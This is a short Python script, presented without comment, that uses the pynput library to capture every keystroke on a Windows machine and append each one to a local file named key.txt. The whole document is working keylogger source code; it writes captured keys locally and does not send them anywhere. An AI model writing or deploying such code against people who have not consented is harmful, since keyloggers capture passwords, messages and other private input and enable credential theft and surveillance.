from pynput import keyboard

def key_listener():
     with keyboard.Listener(on_press = key_log) as lstn:
          lstn.join()

def key_log(key):

     if type(key) == keyboard._win32.KeyCode:
          k = key.char

     else:
          k = ' ' + str(key) + ' '


     data = str(k)
     with open("key.txt", "a") as File:
          File.write(data+'\n')
          File.close()
         
key_listener()
